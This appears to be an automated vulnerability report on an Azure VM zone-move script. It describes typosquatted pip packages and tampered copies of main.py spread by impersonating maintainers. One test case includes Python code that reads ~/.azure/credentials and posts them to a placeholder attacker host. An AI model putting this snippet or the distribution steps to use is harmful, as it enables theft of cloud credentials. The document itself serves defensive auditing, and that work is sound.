### Vulnerability 1: Social Engineering via Malicious Package Installation

- **Vulnerability Name:** Social Engineering via Malicious Package Installation
- **Description:**
    - An attacker can create a malicious Python package.
    - The attacker names this package similarly to a legitimate package that might be listed in a `requirements.txt` file for this project (although `requirements.txt` is not provided in the project files, the `README.md` mentions installing requirements).
    - The attacker then hosts this malicious package on a public or rogue package repository.
    - By impersonating a project maintainer or contributor, the attacker socially engineers users into installing this malicious package. This could be done by:
        - Creating a fake repository that looks like the legitimate one but points to the malicious package.
        - Compromising communication channels (forums, social media) to distribute instructions that include installing the malicious package.
        - Modifying a `requirements.txt` file (if distributed through compromised channels) to include or replace legitimate packages with the malicious one.
    - When a user follows these compromised instructions and uses `pip install -r requirements.txt` or a similar command, they unknowingly install and execute the attacker's malicious package.
- **Impact:**
    - Arbitrary code execution on the user's machine.
    - Potential for data theft from the user's local system.
    - Full compromise of the user's development environment.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - None. The project does not include any measures to verify the integrity or source of Python packages.
- **Missing Mitigations:**
    - **Dependency Verification:** Implement and document a process for verifying the integrity and authenticity of Python packages. This could include:
        - Providing a `requirements.txt` file with pinned versions and hashes of dependencies in the official repository.
        - Instructing users to verify package hashes against a trusted source before installation.
    - **Code Signing for Releases:** If the project distributes packages directly, signing these packages would help users verify their origin and integrity.
    - **Clear Installation Instructions:** Provide clear and concise instructions in the official documentation, emphasizing downloading the project from the official repository and avoiding third-party sources for installation instructions.
- **Preconditions:**
    - The user must intend to use the scripts in the `vm-zone-move` directory and follow installation instructions.
    - The attacker must successfully impersonate a trusted source and convince the user to install the malicious package.
- **Source Code Analysis:**
    - The file `/code/vm-zone-move/README.md` instructs users to install Python packages using `pip install -r requirements.txt`.
    ```
    * Install the required python packages as mentioned in requirements.txt
      * pip install -r requirements.txt
    ```
    - The `requirements.txt` file itself is not provided in the project files. This lack of a defined `requirements.txt` increases the risk if users are instructed to create one from potentially untrusted sources or if a malicious `requirements.txt` is distributed.
    - The project code does not include any checks or validations on the installed packages. `pip install -r requirements.txt` will blindly install whatever is listed in the `requirements.txt` file.
- **Security Test Case:**
    1. **Setup Malicious Package:** Create a malicious Python package named, for example, `azure-mgmt-compute-rogue`, designed to execute arbitrary code upon installation (e.g., print a warning and create a file).
    2. **Host Malicious Package:** Host this `azure-mgmt-compute-rogue` package on a local PyPI server or a publicly accessible rogue repository.
    3. **Create Malicious Instructions:** Craft instructions (e.g., a modified README or a post in a forum) that instruct users to:
        - Download the project code from a compromised location or a look-alike repository.
        - Use a modified `requirements.txt` file that includes `azure-mgmt-compute-rogue` instead of or in addition to legitimate Azure management packages.
    4. **Social Engineering:** Distribute these malicious instructions through channels where users interested in Azure VM recovery might find them (e.g., forums, social media groups related to Azure, comments on legitimate posts, etc.).
    5. **User Execution:** A test user, intending to use the VM recovery scripts, follows the malicious instructions and executes `pip install -r requirements.txt` (using the malicious `requirements.txt`).
    6. **Verification:** Observe that the malicious code from `azure-mgmt-compute-rogue` executes during the `pip install` process (e.g., the warning message is printed, and the file is created), demonstrating arbitrary code execution due to the installation of the malicious package.

### Vulnerability 2: Social Engineering via Malicious Script Execution

- **Vulnerability Name:** Social Engineering via Malicious Script Execution
- **Description:**
    - An attacker modifies the `main.py` script (or any other script intended for user execution) to include malicious code.
    - The attacker then distributes this modified script, impersonating a project maintainer or contributor. This could involve:
        - Hosting the modified script on a fake website that mimics the official project repository.
        - Sharing the malicious script through compromised communication channels (email, forums, social media).
        - Creating a seemingly legitimate patch or update that, in fact, replaces the original script with the malicious one.
    - A user, believing they are downloading and running the legitimate recovery script, executes the attacker's modified `main.py`.
    - The malicious code embedded in the script is then executed, potentially compromising the user's Azure environment and/or their local machine.
- **Impact:**
    - Compromise of the user's Azure subscription.
    - Potential for unauthorized access to and manipulation of Azure resources, including virtual machines.
    - Data exfiltration from Azure VMs or the user's local environment.
    - Denial of service by disrupting or deleting Azure resources.
    - Potential compromise of the local machine if the script interacts with local files or credentials.
- **Vulnerability Rank:** Critical
- **Currently Implemented Mitigations:**
    - None. The project offers no mechanism to ensure the authenticity and integrity of the scripts.
- **Missing Mitigations:**
    - **Code Signing for Scripts:** Digitally signing the scripts would allow users to verify that the scripts originate from a trusted source and have not been tampered with.
    - **Checksum Verification:** Providing checksums (e.g., SHA256 hashes) of the scripts in the official documentation would enable users to verify the integrity of downloaded scripts.
    - **Secure Distribution Channels:** Emphasize using only official and trusted channels (e.g., the official GitHub repository) for downloading the scripts. Warn users against downloading scripts from untrusted sources.
    - **Input Validation and Sanitization:** While not directly preventing malicious script execution from external sources, robust input validation and sanitization within the scripts can limit the damage if a user is tricked into running a modified script with malicious inputs.
- **Preconditions:**
    - The user must intend to use the scripts in the `vm-zone-move` directory, specifically `main.py`.
    - The attacker must successfully impersonate a trusted source and convince the user to download and execute the malicious script.
- **Source Code Analysis:**
    - The file `/code/vm-zone-move/README.md` instructs users to download and run `main.py` using Python.
    ```
    * Run main.py with the arguments as the details of the affected VM in the zonal outage.
    ### Example:
    python "path to main.py" --subscription_id "subscription id" --old_vm_name "old vm name" --new_vm_name "recovered vm name" --resource_group_name "resource group name" --new_zone "zone number" --admin_password "password"
    ```
    - There are no built-in checks within the project to verify the integrity of `main.py` before execution. If a user downloads and runs a modified `main.py`, the code will execute without any validation.
- **Security Test Case:**
    1. **Create Malicious Script:** Modify the `main.py` script to include malicious code. For example, add code to exfiltrate Azure credentials to an attacker-controlled server or to delete a test resource group if the provided subscription ID matches a test subscription.
    ```python
    # ... (rest of the original main.py) ...
    import os
    import requests

    # Malicious code: Attempt to exfiltrate Azure credentials (highly simplified example)
    try:
        with open(os.path.expanduser('~/.azure/credentials'), 'r') as f:
            credentials = f.read()
            requests.post("http://attacker-server.com/receive_credentials", data={'creds': credentials}) # Replace with attacker's server
            print("Attempted to send credentials to attacker-server.com (This is a test, replace with actual malicious action)")
    except Exception as e:
        print(f"Credential exfiltration attempt failed: {e}")

    main()
    ```
    2. **Distribute Malicious Script:** Host this modified `main.py` on a rogue website or distribute it via email or a forum post, accompanied by instructions that mimic the legitimate usage instructions from the project's `README.md`.
    3. **Social Engineering:**  Impersonate a project maintainer or a helpful community member to encourage users to download and use this modified `main.py`. For example, create a forum post claiming to offer a "fixed" or "improved" version of the script and link to the malicious `main.py`.
    4. **User Execution:** A test user, intending to use the VM recovery script, is tricked into downloading and executing the malicious `main.py` (e.g., `python main.py --subscription_id ... --resource_group_name ... --old_vm_name ... --new_vm_name ... --admin_password ...`).
    5. **Verification:** Observe the execution of the malicious code. In this example, verify if a request is sent to `attacker-server.com` (using network monitoring tools) or if the test resource group is deleted (if the malicious code targets resource deletion in a test subscription). This demonstrates the potential for malicious actions due to the execution of the compromised script.
